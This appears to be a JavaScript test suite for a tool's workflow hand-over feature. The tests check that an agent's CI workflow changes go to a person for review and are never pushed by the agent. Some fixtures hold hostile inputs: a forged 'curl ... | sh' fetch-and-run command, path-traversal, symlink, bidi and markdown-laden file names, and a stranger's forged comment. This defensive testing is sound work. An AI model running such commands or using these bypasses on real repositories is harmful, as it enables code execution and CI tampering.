// The workflow hand-over (#226): Factory never pushes a change under .github/workflows/; the worker hands it over in
// $FACTORY_OUT/workflow.patch, Factory applies it in its mirror and publishes git's own diff of the result in its
// comment on the issue, and a person applies it with `factory handover <issue>`, reading it before `--push`. Real git
// for the checks and the command; a fetch fake, and for the command a local HTTP server, for GitHub.
import "./temp.mjs";
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { PLUGIN_ROOT } from "../scripts/lib/checkout.mjs";
import { FACTORY_PROTECTED, decideExit, protectedPaths, renderTaskCard, setSelf, taskCardValues } from "../scripts/lib/logic.mjs";
import { HANDOVER_LABEL, carriesHandover, closedHarnessText, entriesProblem, handoverLine, handoverMarker, handoverOf, handoverText, patchFiles, patchTextProblem, plannedWorkflows, rawEntries, shellQuote, withoutHandoverLine, workflowName, workflowPathsNamed } from "../scripts/lib/handover.mjs";
import { OUT_FILES, handoverChecker, handoverUpFront, inFiles, publishPr } from "../scripts/lib/handoff.mjs";
import { openOutbox } from "../scripts/lib/outbox.mjs";
import { configureGit } from "../scripts/lib/session.mjs";

const quiet = { GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
const env = { ...process.env, ...quiet };
const git = (cwd, ...a) => execFileSync("git", ["-C", cwd, ...a], { encoding: "utf8", env }).trim();
const repo = { owner: "acme", name: "app", full: "acme/app" };
const BOT = "acme-factory[bot]";

/** An origin whose main has a workflow and an app file, and a clone on factory/7 with a workflow change made and git's patch of it. */
function repos() {
  const root = mkdtempSync(join(tmpdir(), "factory-handover-"));
  const origin = join(root, "origin.git");
  const work = join(root, "work");
  execFileSync("git", ["init", "-q", "--bare", "-b", "main", origin]);
  execFileSync("git", ["clone", "-q", origin, work], { env });
  mkdirSync(join(work, ".github", "workflows"), { recursive: true });
  writeFileSync(join(work, ".github", "workflows", "ci.yml"), "name: ci\non: push\n");
  writeFileSync(join(work, "app.txt"), "v1\n");
  git(work, "add", ".");
  git(work, "commit", "-q", "-m", "base");
  git(work, "push", "-q", "origin", "HEAD:main");
  git(work, "checkout", "-q", "-b", "factory/7");
  // The worker's way (factory-deliver-pr reference): the change in the tree, git's own diff of it, the tree put back.
  writeFileSync(join(work, ".github", "workflows", "ci.yml"), "name: ci\non: [push, pull_request]\n");
  writeFileSync(join(work, ".github", "workflows", "release.yml"), "name: release\non: workflow_dispatch\n");
  git(work, "add", "--intent-to-add", "--", ".github/workflows");
  const patch = execFileSync("git", ["-C", work, "diff", "HEAD", "--", ".github/workflows"], { encoding: "utf8", env });
  git(work, "reset", "-q", "--", ".github/workflows");
  git(work, "checkout", "HEAD", "--", ".github/workflows");
  git(work, "clean", "-qfd", "--", ".github/workflows");
  return { root, origin, work, patch };
}

const openBox = (r) => openOutbox({ branch: "factory/7", defaultBranch: "main", checkout: r.work, remote: r.origin, agentEnv: env, protectedList: [".github/"], base: r.root });
const ci = (from, to) => `diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1,2 +1,2 @@\n name: ci\n-${from}\n+${to}\n`;

test("hand-over: the paths an issue names and a plan's Needs-Workflow lines, only workflow names", () => {
  assert.deepEqual(workflowPathsNamed("Add a macOS leg to .github/workflows/ci.yml and a new `.github/workflows/release.yml`."), [".github/workflows/ci.yml", ".github/workflows/release.yml"]);
  assert.deepEqual(workflowPathsNamed("Anything under .github/workflows/ needs a person."), [".github/workflows/"]);
  assert.deepEqual(workflowPathsNamed("Run the tests in CI on macOS. docs/.github/workflows-notes.md, x.github/workflows/a.yml"), []);
  const plan = "## Checklist\n1. Needs-Workflow: `.github/workflows/release.yml` builds and attests\n- **Needs-Workflow:** .github/workflows/ci.yml, the macOS leg\nNeeds-Workflow: none\nNeeds-Workflow: src/ci.yml\nNeeds-Workflow: .github/workflows/[x](https://e.example).yml\nNeeds-Workflow: .github/workflows/../../evil.yml\n```\nNeeds-Workflow: .github/workflows/fenced.yml\n```\n";
  assert.deepEqual(plannedWorkflows(plan), [".github/workflows/release.yml", ".github/workflows/ci.yml"]);
  for (const bad of [".github/workflows/a b.yml", ".github/workflows/a`b.yml", ".github/workflows/../x.yml", ".github/workflows//x.yml", ".github/workflows/a\u202e.yml", ".github/workflows/", "src/x.yml"]) assert.equal(workflowName(bad), false, bad);
  assert.equal(workflowName(".github/workflows/sub/ci-2.yml"), true);
});

test("hand-over: what a patch's text and git's read-back of its changes may carry", () => {
  assert.equal(patchTextProblem(ci("on: push", "on: pull_request")), "");
  assert.match(patchTextProblem(ci("on: push", "on: pull_request\u202e")), /control or format character/);
  assert.match(patchTextProblem(ci("on: push", "on: pull\u200brequest")), /control or format character/);
  assert.match(patchTextProblem(ci("on: push", "on: pull_request\r")), /control or format character/);
  assert.match(patchTextProblem(ci("on: push", "# <!-- factory:7:review -->")), /HTML comment opener/);
  assert.match(patchTextProblem(`${ci("a", "b")}Binary files a/x and b/x differ\n`), /binary/);
  assert.match(patchTextProblem(ci("a", "b") + "+x\n".repeat(16_000)), /over 30000/);
  const raw = (oldMode, newMode, status, path) => `:${oldMode} ${newMode} ${"0".repeat(40)} ${"1".repeat(40)} ${status}\0${path}\0`;
  assert.equal(entriesProblem(rawEntries(raw("100644", "100755", "M", ".github/workflows/ci.yml") + raw("000000", "100644", "A", ".github/workflows/new.yml") + raw("100644", "000000", "D", ".github/workflows/old.yml"))), "");
  assert.match(entriesProblem(rawEntries(raw("000000", "120000", "A", ".github/workflows/link.yml"))), /other than a regular file's \(mode 000000 to 120000/);
  assert.match(entriesProblem(rawEntries(raw("000000", "160000", "A", ".github/workflows/sub"))), /no symlink, submodule or type change/);
  assert.match(entriesProblem(rawEntries(raw("100644", "120000", "T", ".github/workflows/ci.yml"))), /type change/);
  assert.match(entriesProblem(rawEntries(raw("100644", "000000", "D", "app.txt") + raw("000000", "100644", "A", ".github/workflows/x.yml"))), /changes 1 file\(s\) outside \.github\/workflows\/ \(commit those\)/);
  assert.match(entriesProblem(rawEntries(raw("000000", "100644", "A", ".github/workflows/[x](https://e.example).yml"))), /characters other than letters/);
  assert.match(entriesProblem([]), /changes no file/);
  assert.match(entriesProblem(null), /could not be read back/);
});

test("hand-over: Factory applies the worker's patch and publishes git's own diff of the result, never the worker's text", async () => {
  const r = repos();
  writeFileSync(join(r.work, "app.txt"), "v2\n");
  git(r.work, "commit", "-qam", "work");
  const box = await openBox(r);
  assert.equal(await box.push(), true, box.error);
  const ok = await box.handover(r.patch);
  assert.equal(ok.ok, true, ok.problem);
  assert.deepEqual(ok.files, [".github/workflows/ci.yml", ".github/workflows/release.yml"]);
  assert.deepEqual(patchFiles(ok.patch), ok.files);
  // A patch git reads with junk around it and no index lines: what goes out is git's own diff, the same as for the clean one.
  const junky = `Why: the macOS leg.\n${r.patch.replace(/^index .*\n/gm, "")}trailing words\n`;
  const fromJunk = await box.handover(junky);
  assert.equal(fromJunk.ok, true, fromJunk.problem);
  assert.equal(fromJunk.patch, ok.patch);
  // A patch made against another version of the file does not apply.
  assert.match((await box.handover(r.patch.replace("-on: push", "-on: schedule"))).problem, /does not apply to factory\/7 as GitHub has it/);
  // With nothing pushed, the default branch's tree is the one it must apply to.
  const fresh = repos();
  assert.equal((await (await openBox(fresh)).handover(fresh.patch)).ok, true);
});

test("hand-over: every crafted bypass is refused in Factory's mirror (rename or copy from outside, symlink and submodule modes however written, a name that carries markdown, a bidi character)", async () => {
  const r = repos();
  const box = await openBox(r);
  const refused = async (patch, why) => {
    const got = await box.handover(patch);
    assert.equal(got.ok, false, `accepted: ${patch.slice(0, 120)}`);
    assert.match(got.problem, why);
  };
  await refused("diff --git a/app.txt b/.github/workflows/x.yml\nsimilarity index 100%\nrename from app.txt\nrename to .github/workflows/x.yml\n", /renames or copies/);
  await refused("diff --git a/app.txt b/.github/workflows/x.yml\nsimilarity index 100%\ncopy from app.txt\ncopy to .github/workflows/x.yml\n", /renames or copies/);
  await refused("diff --git a/.github/workflows/ci.yml b/ci.yml\nsimilarity index 100%\nrename from .github/workflows/ci.yml\nrename to ci.yml\n", /renames or copies/);
  const link = (mode) => `diff --git a/.github/workflows/l.yml b/.github/workflows/l.yml\nnew file mode ${mode}\n--- /dev/null\n+++ b/.github/workflows/l.yml\n@@ -0,0 +1 @@\n+../../app.txt\n\\ No newline at end of file\n`;
  for (const mode of ["120000", "120000 ", "0120000"]) await refused(link(mode), /symlink, submodule or type change|is no patch git can read|does not apply/);
  await refused(`diff --git a/.github/workflows/sub b/.github/workflows/sub\nnew file mode 160000\nindex 0000000..${"a".repeat(40)}\n--- /dev/null\n+++ b/.github/workflows/sub\n@@ -0,0 +1 @@\n+Subproject commit ${"a".repeat(40)}\n`, /symlink, submodule or type change|is no patch git can read|does not apply/);
  await refused(`diff --git a/.github/workflows/sub b/.github/workflows/sub\nnew file mode 0160000\nindex 0000000..${"a".repeat(40)}\n--- /dev/null\n+++ b/.github/workflows/sub\n@@ -0,0 +1 @@\n+Subproject commit ${"a".repeat(40)}\n`, /symlink, submodule or type change|is no patch git can read|does not apply/);
  await refused("diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\nold mode 100644\nnew mode 120000\n", /symlink, submodule or type change|is no patch git can read|does not apply/);
  const named = "diff --git a/.github/workflows/[x](https:/e.example).yml b/.github/workflows/[x](https:/e.example).yml\nnew file mode 100644\n--- /dev/null\n+++ b/.github/workflows/[x](https:/e.example).yml\n@@ -0,0 +1 @@\n+name: x\n";
  await refused(named, /characters other than letters/);
  await refused(r.patch.replace("name: release", "name: re\u202elease"), /control or format character/);
  await refused(`${r.patch}diff --git a/app.txt b/app.txt\n--- a/app.txt\n+++ b/app.txt\n@@ -1 +1 @@\n-v1\n+v3\n`, /outside \.github\/workflows\//);
});

/** A fetch fake over acme/app: the PR (`pr`, null for none), comments kept as written, every write recorded as {method, path, body}. */
function fakeApi({ pr = null, comments = [] } = {}) {
  const writes = [];
  const store = comments.map((c) => ({ ...c }));
  const real = globalThis.fetch;
  const saved = process.env.GITHUB_API_URL;
  process.env.GITHUB_API_URL = "https://github.test";
  globalThis.fetch = async (url, init = {}) => {
    const u = new URL(url);
    const method = init.method || "GET";
    const json = (b, status = 200) => new Response(JSON.stringify(b), { status, headers: { "content-type": "application/json" } });
    const body = init.body ? JSON.parse(init.body) : null;
    if (u.pathname === "/graphql") return json({ data: { repository: { pullRequest: { closingIssuesReferences: { nodes: [{ number: 7 }] } } } } });
    const path = decodeURIComponent(u.pathname).replace("/repos/acme/app", "");
    if (method !== "GET") {
      writes.push({ method, path, body });
      if (path === "/pulls" && method === "POST") return json({ number: 70, draft: true, ...body });
      if (/^\/pulls\/\d+$/.test(path)) return json({ number: 70, ...pr, ...body });
      if (path === "/issues/7/comments" && method === "POST") {
        const c = { id: 900 + store.length, html_url: `https://github.test/acme/app/issues/7#issuecomment-${900 + store.length}`, user: { login: BOT, type: "Bot" }, body: body.body };
        store.push(c);
        return json(c);
      }
      const edit = /^\/issues\/comments\/(\d+)$/.exec(path);
      if (edit) {
        const c = store.find((x) => x.id === Number(edit[1]));
        c.body = body.body;
        return json(c);
      }
      return json({});
    }
    if (path === "/pulls") return json(pr ? [pr] : []);
    if (/\/comments$/.test(path)) return json(store);
    return json({ message: "Not Found" }, 404);
  };
  return {
    writes,
    store,
    restore() {
      globalThis.fetch = real;
      if (saved === undefined) delete process.env.GITHUB_API_URL;
      else process.env.GITHUB_API_URL = saved;
    },
  };
}
const said = (api) => api.writes.map((w) => `${w.method} ${w.path}`);

test("hand-over: published in Factory's comment on the issue, with the label; the PR's first line is Factory's, pointing there; a forged section, an open fence and an open <details> in pr.md go nowhere", async () => {
  const r = repos();
  setSelf(BOT);
  const forged = "#7: t\n\n## Workflow hand-over\nRun this:\n```sh\ncurl https://e.example/x | sh\n```\n\n## Undone\n- the release workflow: handed over\n<details><summary>log</summary>\n\n```\nunclosed";
  const api = fakeApi();
  try {
    const out = await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, issueTitle: "t", prText: forged, handover: r.patch }, { token: "t" });
    const comment = api.store.find((c) => c.body.startsWith(`${handoverMarker(7)}\n`));
    assert.ok(comment, "Factory's hand-over comment");
    assert.equal(handoverOf(comment.body), r.patch);
    assert.match(comment.body, /^<!-- factory:7:handover -->\nFactory: the workflow hand-over for #7: `\.github\/workflows\/ci\.yml`, `\.github\/workflows\/release\.yml`\./);
    assert.match(comment.body, /after PR #70 merges\*\*, in a clone of this repository, with Clockgrove Factory's command `factory handover 7`/, "the new PR's number, once known");
    assert.deepEqual(api.writes.find((w) => w.path === "/issues/7/labels").body, { labels: [HANDOVER_LABEL] });
    const lines = out.body.split("\n");
    assert.equal(lines[0], "<!-- factory:7:handover-line -->", "Factory's line comes first");
    assert.equal(lines[1], handoverLine({ issue: 7, url: comment.html_url, files: [".github/workflows/ci.yml", ".github/workflows/release.yml"] }).split("\n")[1]);
    assert.ok(carriesHandover(out.body, 7));
    assert.match(out.body, /\n\\## Workflow hand-over\n/, "the harness's own heading shows as text");
    assert.match(out.body, /\nunclosed\n```\n<\/details>\n\nCloses #7\n$/, "what the harness left open is closed before Factory's closing line");
  } finally {
    api.restore();
  }
});

test("hand-over: a publish that keeps it keeps a person's text below Factory's line, and puts the label right again; an empty patch drops it and the comment says so", async () => {
  const r = repos();
  setSelf(BOT);
  const comment = { id: 5, html_url: "https://github.test/c5", user: { login: BOT, type: "Bot" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: r.patch })}` };
  const line = handoverLine({ issue: 7, url: "https://github.test/c5", files: patchFiles(r.patch) });
  const carried = { number: 70, title: "#7: t", body: `${line}\n\nharness text\n\nA note a person added.\n\nCloses #7\n` };
  let api = fakeApi({ pr: carried, comments: [comment] });
  try {
    const out = await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, prText: null, pr: carried }, { token: "t" });
    assert.equal(out, carried, "nothing to rewrite");
    assert.deepEqual(said(api), ["POST /issues/7/labels"], "only the label, put right again (a write GitHub refused before is made now)");
  } finally {
    api.restore();
  }
  api = fakeApi({ pr: carried, comments: [comment] });
  try {
    const out = await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, prText: "#7: t\n\nnew", pr: carried, handover: "" }, { token: "t" });
    assert.equal(out.body, "new\n\nCloses #7\n");
    assert.deepEqual(said(api), ["PATCH /pulls/70", `DELETE /issues/7/labels/${HANDOVER_LABEL}`, "PATCH /issues/comments/5"]);
    assert.equal(api.store[0].body, `${handoverMarker(7)}\nFactory: PR #70 carries no workflow hand-over.`);
  } finally {
    api.restore();
  }
  // An up-front notice is corrected once the PR carries none.
  api = fakeApi({ pr: carried, comments: [{ ...comment, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, named: [".github/workflows/ci.yml"] })}` }] });
  try {
    await publishPr(repo, { branch: "factory/7", base: "main", issue: 7, prText: "#7: t\n\nnew", pr: carried }, { token: "t" });
    assert.equal(api.store[0].body, `${handoverMarker(7)}\nFactory: PR #70 carries no workflow hand-over.`);
  } finally {
    api.restore();
  }
  assert.equal(withoutHandoverLine(`${line}\n\nbody\n\nperson`, 7), "body\n\nperson");
});

test("hand-over: $FACTORY_IN carries the published patch, and the PR body without Factory's line", () => {
  const r = repos();
  const line = handoverLine({ issue: 7, url: "https://github.test/c5", files: patchFiles(r.patch) });
  const files = inFiles({ issue: 7, issueTitle: "t", issueBody: "b", pr: { title: "#7: t", body: `${line}\n\n## Acceptance\n- done\n\nCloses #7` }, handover: r.patch });
  assert.equal(files["workflow.patch"], r.patch);
  assert.equal(files["pr.md"], "#7: t\n\n## Acceptance\n- done\n\nCloses #7\n");
  assert.ok(OUT_FILES.includes("workflow.patch"));
  assert.equal(inFiles({ issue: 7, issueTitle: "t", issueBody: "b", pr: { title: "#7: t", body: "plain" } })["workflow.patch"], undefined);
});

test("hand-over: the comment's by-hand steps quote every value; harness text left open is closed", () => {
  const text = handoverText({ issue: 7, pr: 70, patch: ci("a", "b"), defaultBranch: "it's-main" });
  assert.match(text, /`git fetch origin 'it'\\''s-main'` and `git switch -c 'factory-workflow\/7' 'origin\/it'\\''s-main'`/);
  assert.match(text, /^```diff$/m);
  assert.match(handoverText({ issue: 7, pr: 70, patch: ci("a", "````b") }), /^`{5}diff$/m, "a fence longer than any backtick run in the patch");
  assert.equal(shellQuote("a'b"), `'a'\\''b'`);
  assert.equal(closedHarnessText("x\n~~~~\ncode\n~~~\nmore"), "x\n~~~~\ncode\n~~~\nmore\n~~~~");
  assert.equal(closedHarnessText("```js\nok\n```\n<pre>\nraw"), "```js\nok\n```\n<pre>\nraw\n</pre>");
  assert.equal(closedHarnessText("### workflow handover notes"), "\\### workflow handover notes");
  assert.equal(closedHarnessText("```\n## Workflow hand-over\n```"), "```\n## Workflow hand-over\n```", "inside a fence nothing counts");
});

test("hand-over: before any harness, the notice once, sanitised; a notice Factory already wrote stands", async () => {
  setSelf(BOT);
  let api = fakeApi();
  try {
    assert.equal(await handoverUpFront(repo, 7, { named: [] }, { token: "t" }), false);
    assert.equal(await handoverUpFront(repo, 7, { named: [".github/workflows/ci.yml"] }, { token: "t" }), true);
    assert.equal(said(api).join(), "POST /issues/7/comments");
    assert.match(api.store[0].body, /^<!-- factory:7:handover -->\nFactory: this Objective's text names `\.github\/workflows\/ci\.yml`\. Factory never pushes a change under `\.github\/workflows\/`.*Factory posts the exact change here for a person to apply after the PR merges/);
  } finally {
    api.restore();
  }
  api = fakeApi({ comments: [{ id: 1, user: { login: BOT, type: "Bot" }, body: `${handoverMarker(7)}\nFactory: PR #70 carries no workflow hand-over.` }] });
  try {
    assert.equal(await handoverUpFront(repo, 7, { named: [".github/workflows/ci.yml"], from: "plan" }, { token: "t" }), false);
    assert.deepEqual(api.writes, []);
  } finally {
    api.restore();
  }
});

test("hand-over: the checker gives git's patch, none, or keeps the published one, and names a refused one for the Block", async () => {
  let files = {};
  const box = { handover: async (t) => (t.includes("app.txt") ? { ok: false, problem: "changes 1 file(s) outside .github/workflows/ (commit those)" } : { ok: true, patch: "git's own\n", files: [] }) };
  const c = handoverChecker(() => files, box);
  assert.equal(await c.now(), undefined, "no file: the published one stands");
  files = { "workflow.patch": "  \n" };
  assert.equal(await c.now(), "");
  files = { "workflow.patch": "the worker's text" };
  assert.equal(await c.now(), "git's own\n", "what Factory publishes is git's, not the worker's");
  assert.equal(c.refused(), "");
  files = { "workflow.patch": "app.txt" };
  assert.equal(await c.now(), undefined);
  assert.equal(c.refused(), "the workflow hand-over ($FACTORY_OUT/workflow.patch) changes 1 file(s) outside .github/workflows/ (commit those); Factory did not publish it");
});

test("hand-over: the exit Blocks on a refused hand-over; only a delivered run that left nothing but a hand-over Blocks as one, and a worker's Question, Block or failed harness keep their exits", () => {
  const ok = { ok: true };
  const pr = { exists: true, draft: false, body: "" };
  const delivered = { exit: "delivered", questions: [], reason: "" };
  assert.deepEqual(decideExit({ harness: ok, pr, commits: 2, validation: { passes: 1, green: true }, handoverRefused: "the workflow hand-over ($FACTORY_OUT/workflow.patch) carries a binary change; Factory did not publish it" }), { exit: "blocked", reason: "the workflow hand-over ($FACTORY_OUT/workflow.patch) carries a binary change; Factory did not publish it", cause: "work" });
  assert.deepEqual(decideExit({ harness: ok, pr, commits: 2, validation: { passes: 1, green: true } }), { exit: "delivered", reason: "" }, "a PR with a hand-over is delivered like any other");
  const only = decideExit({ harness: ok, pr: null, commits: 0, record: delivered, handoverOnly: true });
  assert.deepEqual(only, { exit: "blocked", reason: "the whole change is a workflow hand-over, which Factory never pushes: a person applies it with `factory handover`, as Factory's hand-over comment on this issue says", cause: "setup", handoverOnly: true });
  const question = decideExit({ harness: ok, pr: null, commits: 0, record: { exit: "question", questions: [{ question: "Which runner?", test: "decision", existing: "x" }], reason: "" }, handoverOnly: true });
  assert.equal(question.exit, "question", "a Question with a leftover patch stays a Question");
  assert.equal(question.handoverOnly, undefined);
  assert.equal(decideExit({ harness: ok, pr: null, commits: 0, record: { exit: "blocked", reason: "no runner", questions: [] }, handoverOnly: true }).reason, "worker blocked: no runner");
  assert.equal(decideExit({ harness: { ok: false, error: "exit 1" }, pr: null, commits: 0, record: delivered, handoverOnly: true }).handoverOnly, undefined);
  assert.equal(decideExit({ harness: { ok: true, timedOut: true }, pr: null, commits: 0, record: delivered, handoverOnly: true }).reason, "time cap reached");
  assert.match(decideExit({ harness: ok, pr, commits: 1, protectedHits: [".github/workflows/ci.yml"] }).reason, /^touched protected path \.github\/workflows\/ci\.yml; Factory never pushes a workflow file: the worker hands the change over in \$FACTORY_OUT\/workflow\.patch/);
  assert.equal(decideExit({ harness: ok, pr, commits: 1, protectedHits: [".github/workflows/ci.yml", ".github/dependabot.yml"] }).reason, "touched protected path .github/workflows/ci.yml, .github/dependabot.yml");
});

test("hand-over: the commit hook names the hand-over when it refuses a workflow file, and only then", async () => {
  const dir = mkdtempSync(join(tmpdir(), "factory-handover-hook-"));
  execFileSync("git", ["init", "-q", dir], { env });
  await configureGit(dir, { login: "t", id: 1, protectedList: FACTORY_PROTECTED, credentialHelper: null, env });
  const commit = (file) => {
    mkdirSync(join(dir, file, ".."), { recursive: true });
    writeFileSync(join(dir, file), "x\n");
    execFileSync("git", ["-C", dir, "add", "."], { env });
    try {
      execFileSync("git", ["-C", dir, "commit", "-q", "-m", file], { env, stdio: "pipe" });
      return "ok";
    } catch (e) {
      execFileSync("git", ["-C", dir, "reset", "-q"], { env });
      execFileSync("git", ["-C", dir, "clean", "-qfd"], { env });
      return String(e.stderr).trim();
    }
  };
  assert.equal(commit(".github/workflows/ci.yml"), "factory: refusing commit on protected path(s): .github/workflows/ci.yml\nfactory: Factory never pushes a workflow file; keep the change out of your commits and hand it over in $FACTORY_OUT/workflow.patch (factory-deliver-pr)");
  assert.equal(commit(".github/dependabot.yml"), "factory: refusing commit on protected path(s): .github/dependabot.yml");
});

test("hand-over: the task card names workflow.patch as an output, in both directions", () => {
  const card = renderTaskCard(readFileSync(join(PLUGIN_ROOT, "templates", "task-card.md"), "utf8"), taskCardValues({ issue: 7, maxUsd: 5, timeoutMinutes: 60, validation: [], budgetCommand: "", protectedPaths: protectedPaths() }));
  assert.match(card, /- `workflow\.patch`: only when the Objective needs a change under `\.github\/workflows\/`, which Factory never pushes: that change as `git diff` writes it, kept out of your commits, for a person to apply \(factory-deliver-pr\)\. `\$FACTORY_IN\/workflow\.patch` is the one Factory published\./);
});

test("hand-over: every route's work stage says it before any harness, and every publish carries the checked hand-over (worker, review's answer pass, a session's deliver)", () => {
  // Actions runs worker.mjs and review.mjs; a cloud sandbox stage and local mode's loop run the same scripts (edit-after-plan.test.mjs).
  const src = (f) => readFileSync(join(PLUGIN_ROOT, "scripts", f), "utf8");
  const worker = src("worker.mjs");
  const run = worker.indexOf("async function run()");
  const notice = worker.indexOf("await handoverUpFront(repo, issue, { named: namedWorkflows }", run);
  assert.ok(notice > worker.indexOf("await authorGate(", run), "on the text the trust check read");
  for (const later of ["openOutbox(", "installPlugin(", "runHarness(", "openHandoff("]) assert.ok(worker.indexOf(later, run) > notice, `before ${later}`);
  assert.match(worker, /io\.tick\(\(plan\) => \{\n\s+planWorkflows\(plan\);/, "the plan's Needs-Workflow lines as the harness writes them");
  assert.match(worker, /const handover = handoverChecker\(\(\) => io\.files\(\), outbox\);/);
  assert.match(worker, /publishPr\(repo, \{[^\n]*handover: await handoverNow\(\) \}, token\)/);
  assert.match(worker, /handoverRefused: handover\.refused\(\),\n\s+handoverOnly: !pr && !delta\.count && !!handoverLeft,/);
  assert.match(worker, /if \(decision\.handoverOnly\) await handoverOnIssue\(/, "on the issue only for the hand-over-only Block");
  const review = src("review.mjs");
  assert.match(review, /const handover = handoverChecker\(\(\) => io\.files\(\), outbox\);\n\s+const publish = async \(current\) => publishPr\(repo, \{[^\n]*handover: await handover\.now\(\) \}/);
  assert.match(review, /handoverRefused: handover\.refused\(\),/);
  assert.equal((review.match(/reviewerPrompt\(\{[^\n]*handover: handoverPatch \}\)/g) || []).length, 2, "the reviewer gets the published patch");
  const local = src("local.mjs");
  const deliver = local.slice(local.indexOf("async function deliver("));
  assert.match(deliver, /const checker = handoverChecker\(\(\) => files, outbox\);/);
  assert.match(deliver, /publishPr\(repo, \{[^\n]*pr: open, handover \}, opts\)/);
  assert.match(deliver, /if \(only\?\.handoverOnly\) \{/);
});

/** A local GitHub for the `factory handover` command: the repository, the issue's timeline and comments; pull creates refused. */
async function fakeGitHub({ timeline, comments }) {
  const server = createServer((req, res) => {
    const path = new URL(req.url, "http://x").pathname;
    const send = (b, status = 200) => {
      res.writeHead(status, { "content-type": "application/json" });
      res.end(JSON.stringify(b));
    };
    if (req.method !== "GET") return send({ message: "no writes here" }, 403);
    if (path === "/repos/acme/app") return send({ full_name: "acme/app", default_branch: "main" });
    if (path === "/repos/acme/app/issues/7/timeline") return send(timeline);
    if (path === "/repos/acme/app/issues/7/comments") return send(comments);
    return send({ message: "Not Found" }, 404);
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((r) => server.close(r)) };
}

const runCli = (args, { cwd, env: e }) =>
  new Promise((resolve) => {
    const child = spawn(process.execPath, [join(PLUGIN_ROOT, "scripts", "local.mjs"), ...args], { cwd, env: e });
    let out = "";
    let err = "";
    child.stdout.on("data", (d) => (out += d));
    child.stderr.on("data", (d) => (err += d));
    child.on("close", (code) => resolve({ code, out, err }));
  });

test("hand-over: `factory handover` applies Factory's comment (never a stranger's) on a new branch, shows it and stops; `--push` then commits, pushes and opens its PR", async () => {
  const r = repos();
  const ok = await (await openBox(r)).handover(r.patch);
  const factory = { id: 2, user: { login: BOT, type: "Bot" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: ok.patch })}` };
  // Anyone can paste the marker: a stranger's comment, first, with another change, is never read.
  const evil = ci("on: push", "on: pull_request_target");
  const stranger = { id: 1, user: { login: "stranger", type: "User" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: evil })}` };
  const gh = await fakeGitHub({ timeline: [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: BOT }, created_at: "2031-03-02T01:00:00Z" }], comments: [stranger, factory] });
  try {
    const person = join(r.root, "person");
    execFileSync("git", ["clone", "-q", r.origin, person], { env });
    const bin = join(r.root, "bin");
    mkdirSync(bin);
    writeFileSync(join(bin, "gh"), `#!/bin/sh\necho "$@" > ${JSON.stringify(join(r.root, "gh-args"))}\necho https://github.test/acme/app/pull/71\n`);
    chmodSync(join(bin, "gh"), 0o755);
    const e = { ...env, GITHUB_API_URL: gh.url, FACTORY_LOCAL_TOKEN: "t", PATH: `${bin}:${process.env.PATH}` };
    const first = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: e });
    assert.equal(first.code, 0, first.err);
    assert.match(first.out, /\+on: \[push, pull_request\]/, "the diff, shown");
    assert.doesNotMatch(first.out, /pull_request_target/, "the stranger's change is never read");
    assert.match(first.out, /nothing is committed or pushed/);
    assert.match(first.out, /Read the diff above before you push it: a workflow runs with the repository's secrets, and one that runs `on: push` runs as soon as its branch is pushed\. When you have, run `factory handover 7 --push`/);
    assert.equal(git(person, "symbolic-ref", "--short", "HEAD"), "factory-workflow/7");
    assert.equal(git(person, "diff", "--cached", "--name-only"), ".github/workflows/ci.yml\n.github/workflows/release.yml");
    assert.equal(execFileSync("git", ["-C", r.origin, "branch", "--list", "factory-workflow/7"], { encoding: "utf8" }), "", "nothing pushed before the read");
    const again = await runCli(["handover", "7", "--repo", "acme/app", "--dir", person], { cwd: person, env: e });
    assert.notEqual(again.code, 0);
    assert.match(again.err, /uncommitted changes|exists already/);
    const push = await runCli(["handover", "7", "--push", "--repo", "acme/app", "--dir", person], { cwd: person, env: e });
    assert.equal(push.code, 0, push.err);
    assert.equal(git(r.origin, "show", "factory-workflow/7:.github/workflows/ci.yml"), "name: ci\non: [push, pull_request]");
    assert.equal(git(r.origin, "show", "factory-workflow/7:.github/workflows/release.yml"), "name: release\non: workflow_dispatch");
    assert.equal(git(r.origin, "log", "-1", "--format=%s", "factory-workflow/7"), "#7: the workflow change Factory handed over");
    assert.equal(readFileSync(join(r.root, "gh-args"), "utf8").trim(), "pr create --repo acme/app --base main --head factory-workflow/7 --fill");
    assert.match(push.out, /https:\/\/github\.test\/acme\/app\/pull\/71/);
  } finally {
    await gh.close();
  }
});

test("hand-over: `factory handover` refuses a hand-over no Factory label vouches for, and a change it would not publish", async () => {
  const r = repos();
  const person = join(r.root, "person");
  execFileSync("git", ["clone", "-q", r.origin, person], { env });
  const cases = [
    { timeline: [], comments: [], why: /carries no workflow hand-over from Factory/ },
    { timeline: [{ event: "labeled", label: { name: HANDOVER_LABEL }, actor: { login: "github-actions[bot]" }, created_at: "2031-03-02T01:00:00Z" }], comments: [{ id: 1, user: { login: "github-actions[bot]" }, body: `${handoverMarker(7)}\n${handoverText({ issue: 7, pr: 70, patch: r.patch })}` }], why: /carries no workflow hand-over from Factory/ },
